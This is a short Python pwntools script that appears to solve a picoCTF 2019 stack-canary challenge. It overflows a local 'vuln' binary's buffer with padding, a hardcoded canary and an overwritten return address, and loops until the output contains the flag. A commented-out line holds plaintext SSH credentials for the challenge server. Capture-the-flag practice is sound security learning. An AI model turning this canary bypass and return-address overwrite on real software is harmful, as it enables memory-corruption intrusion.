from pwn import *

flag=''
while(True):

    #s = ssh(host='2019shell1.picoctf.com',user='Arch3R',password='Archer@12345')
    #sh = s.process('vuln' , cwd='/problems/canary_3_257a2a2061c96a7fb8326dbbc04d0328')


    sh = process("./vuln")

    pad = 'A'*32

    canary="57Gh"


    addr = p32(0x565c97ed)

    extra='b'*16

    #gdb.attach(sh)


    print(sh.recvline())

    print(sh.recvuntil('> '))


    exploit=pad + canary + extra + addr 
    sh.sendline(str(len(exploit)))

    sh.recvuntil('Input> ')


    sh.send(exploit)

    flag= sh.recvall()

    if 'flag' in flag:
        print(flag)
        break
        
        

        
                
